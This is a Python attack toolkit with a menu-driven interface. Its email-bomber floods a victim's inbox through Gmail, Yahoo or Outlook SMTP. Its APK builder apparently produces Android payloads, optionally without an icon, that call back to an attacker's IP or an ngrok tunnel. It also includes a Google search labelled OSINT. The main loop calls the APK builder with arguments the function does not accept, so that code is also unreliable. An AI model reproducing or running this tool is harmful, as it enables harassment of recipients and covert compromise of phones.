import os
import smtplib
from requests import get
from googlesearch import search
from bs4 import BeautifulSoup
import colorama
import socket

try:
    from pyngrok import ngrok
except ImportError:
    ngrok = None
    print("[-] pyngrok not found. Install it with: pip install pyngrok")

try:
    from utils import build
except ImportError:
    build = None
    print("[-] Could not import 'build' from utils.py.")

colorama.init(autoreset=True)

class Colors:
    red = colorama.Fore.RED
    blue = colorama.Fore.BLUE
    green = colorama.Fore.GREEN
    magenta = colorama.Fore.MAGENTA
    yellow = colorama.Fore.YELLOW
    reset = colorama.Fore.RESET

def std_output(output_type):
    colors = {
        "info": Colors.green,
        "error": Colors.red,
        "warning": Colors.yellow,
        "fail": Colors.magenta
    }
    return colors.get(output_type.lower(), Colors.reset)

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def validate_port(port):
    return port.isdigit() and 1 <= int(port) <= 65535

def display_kanki():
    kanki = f"""
             {Colors.red}kiya enjil
                                          {Colors.blue}
                                                      ████                
                                                    ██▓▓██                
                                                ████▓▓██████              
                                    ██████████████▓▓██░░████              
                          ██████████████████████▓▓██░░░░████              
                  ████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██▓▓██░░░░░░████████          
              ██████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██░░░░░░██▓▓▓▓▓▓████        
          ██████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░░░░░██▓▓▓▓▓▓▓▓████      
    ██████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓████    
    ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██    
██████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████  
  ████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██████▓▓▓▓▓▓████
        ██████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓      ██▓▓▓▓████
        ██████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓      ██▓▓▓▓████
            ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██        ██▓▓██  
        ████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██      ██████▓▓██
    ██▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██      ██████████
  ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██████      ██████████
  ████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████░░██        ██      
    ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██░░░░██░░██              
      ██████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██░░░░░░░░░░██            
            ████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██████▓▓▓▓▓▓▓▓██░░░░░░░░░░████████      
                  ██▓▓▓▓▓▓▓▓▓▓▓▓██░░░░▓▓▓▓▓▓▓▓██░░░░░░░░░░██████████      
                  ██▓▓▓▓▓▓▓▓▓▓██░░░░░░░░▓▓▓▓████████████████              
                ██▓▓▓▓▓▓▓▓▓▓▓▓██░░░░██████████      ████                  
        ██████▓▓▓▓▓▓▓▓▓▓▓▓▓▓██░░░░██        ██          ██                
              ██████▓▓▓▓▓▓▓▓██░░██  ████    ██          ██                
    ██████        ██▓▓▓▓██▓▓░░░░██████████  ██          ██                
    ██▒▒▒▒██████████    ████░░░░██░░░░████  ██          ██                
    ██▒▒▒▒▒▒▒▒██          ██░░░░░░░░░░████  ██          ██                
  ██    ▒▒▒▒▒▒██          ██████░░░░░░████  ██        ██                   
  ██    ▒▒▒▒▒▒██          ██▓▓▓▓████████    ██        ██                   
  ██          ██          ██▓▓▓▓████      ██        ████                   
██▒▒▒▒      ░░████      ██▓▓▓▓▓▓▓▓██  ████          ██                     
██▒▒▒▒▒▒    ██    ████████████████████  ████████████                       
██▒▒▒▒▒▒▒▒▒▒██          ██              ██                                
  ██▒▒▒▒▒▒██          ██                ██                                
  ██▒▒▒▒██            ██              ██                                  
    ████                ██              ██                                  
                      ██                ██                                 
                      ████████████████████                                
                      ██▒▒▒▒▒▒▒▒▒▒        ████                            
                      ██▒▒▒▒▒▒▒▒          ▒▒▒▒██                          
                      ██▒▒▒▒▒▒▒▒      ▒▒▒▒▒▒▒▒▒▒██                        
                      ██▒▒▒▒▒▒      ▒▒▒▒▒▒▒▒▒▒▒▒██                        
                      ████████████████████████████
    """
    print(kanki)

def email_bomber(server_choice, user, pwd, to, subject, body, count):
    message = f'From: {user}\nSubject: {subject}\n\n{body}'
    sent = 0

    smtp_servers = {
        'gmail': "smtp.gmail.com",
        'yahoo': "smtp.mail.yahoo.com",
        'outlook': "smtp-mail.outlook.com"
    }

    try:
        smtp_server = smtp_servers.get(server_choice.lower())
        if not smtp_server:
            print(std_output("error") + "Invalid email server type.")
            return

        server = smtplib.SMTP(smtp_server, 587)
        server.starttls()
        server.login(user, pwd)

        while sent < count:
            try:
                server.sendmail(user, to, message)
                sent += 1
                print(std_output("info") + f"[+] Sent {sent} email(s)")
            except KeyboardInterrupt:
                print(std_output("fail") + "Cancelled by user.")
                break
            except Exception as e:
                print(std_output("error") + f"Send error: {str(e)}")
                break

        server.quit()
    except Exception as e:
        print(std_output("error") + f"Connection failed: {str(e)}")

def search_google(query):
    try:
        print(std_output("info") + f"Searching Google for: {query}")
        return search(query, num_results=5)
    except Exception as e:
        print(std_output("error") + f"Search error: {str(e)}")
        return []

def fetch_page_html(url):
    try:
        response = get(url)
        return BeautifulSoup(response.text, 'html.parser')
    except Exception as e:
        print(std_output("error") + f"Fetch error: {str(e)}")
        return None

def apk_file_builder():
    use_ngrok = input("Use ngrok tunnel? (y/n): ").strip().lower() == "y"
    apk_name = input("Enter APK file name: ").strip()
    icon_input = input("Add visible icon? (y/n): ").strip().lower()
    icon = True if icon_input == "y" else None

    if use_ngrok:
        if ngrok is None:
            print(std_output("error") + "Ngrok is not installed.")
            return
        try:
            from pyngrok import conf
            conf.get_default().monitor_thread = False
            port = "8000"
            tcp_tunnel = ngrok.connect(port, "tcp")
            domain, port = tcp_tunnel.public_url[6:].split(":")
            ip = socket.gethostbyname(domain)
            print(std_output("info") + f"Ngrok Tunnel IP: {ip}, Port: {port}")
            if build:
                build(ip, port, apk_name, True, "8000", icon)
        except Exception as e:
            print(std_output("error") + f"Ngrok error: {str(e)}")
    else:
        ip = input("Enter IP address: ").strip()
        port = input("Enter port: ").strip()
        if not validate_ip(ip) or not validate_port(port):
            print(std_output("error") + "Invalid IP or port.")
            return
        if build:
            build(ip, port, apk_name, False, None, icon)


def show_help():
    help_text = """
    Available commands:
    /exit        : Exit the program
    /help        : Show this help message
    /email-bomber : Start email bomber
    /osint       : Perform Google search
    /APK-file    : Build an APK file
    """
    print(std_output("info") + help_text)

def main():
    clear_console()
    display_kanki()

    while True:
        command = input("Enter command (/help for help): ").strip().lower()

        if command == "/exit":
            print(std_output("info") + "Exiting program...")
            break
        elif command == "/help":
            show_help()
        elif command == "/email-bomber":
            server_choice = input("Choose email server (gmail/yahoo/outlook): ").strip()
            user = input("Enter your email: ").strip()
            pwd = input("Enter your email password: ").strip()
            to = input("Enter recipient email: ").strip()
            subject = input("Enter email subject: ").strip()
            body = input("Enter email body: ").strip()
            count = int(input("How many emails to send? ").strip())
            email_bomber(server_choice, user, pwd, to, subject, body, count)
        elif command == "/osint" or command == "/search-links":
            query = input("Enter search query: ").strip()
            results = search_google(query)
            if results:
                print(std_output("info") + "Search results:")
                for result in results:
                    print(result)
            else:
                print(std_output("error") + "No results found.")
        elif command == "/apk-file":
            file_name = input("Enter APK file name: ").strip()
            use_ngrok = input("Use ngrok tunnel? (y/n): ").strip().lower() == "y"
            apk_file_builder(file_name, use_ngrok)
        else:
            print(std_output("error") + "Unknown command. Type '/help' for a list of commands.")

if __name__ == "__main__":
    main()

